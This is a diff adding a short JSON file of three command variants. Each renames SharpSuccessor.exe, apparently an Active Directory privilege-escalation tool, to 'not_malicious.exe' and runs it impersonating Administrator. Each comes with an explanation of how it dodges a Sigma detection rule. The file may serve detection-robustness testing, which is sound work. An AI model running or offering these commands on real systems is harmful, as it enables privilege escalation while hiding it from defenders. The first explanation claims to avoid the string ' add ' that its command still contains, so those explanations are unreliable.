@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy SharpSuccessor.exe not_malicious.exe && not_malicious.exe add /impersonate:Administrator /path:C:\\Windows\\System32 /account:TestUser /name:DnsAdmin",
+    "explanation": "The original command is modified using substitution (shortening whitespace and using colon instead of space for flags) and reordering (moving flags to different positions where valid). This bypasses the Sigma rule's detection by altering the command line structure while maintaining the same behavior."
+  },
+  {
+    "output": "copy SharpSuccessor.exe not_malicious.exe && not_malicious.exe /add /imp:Administrator /path:C:\\Windows\\System32 /acc:TestUser /n:DnsAdmin",
+    "explanation": "The command uses substitution (shortening flags like /impersonate to /imp and /name to /n) and omits optional whitespace. This mutation avoids the rule's detection by not matching the exact string ' add ', while still executing the same functionality."
+  },
+  {
+    "output": "copy SharpSuccessor.exe not_malicious.exe && not_malicious.exe /add /impersonate:Administrator /path:C:\\Windows\\System32 /account:TestUser /name:DnsAdmin",
+    "explanation": "This command uses colons instead of spaces after flags and preserves the original command structure. It avoids detection by not including the exact string ' add ', which is part of the Sigma rule's detection logic."
+  }
+]
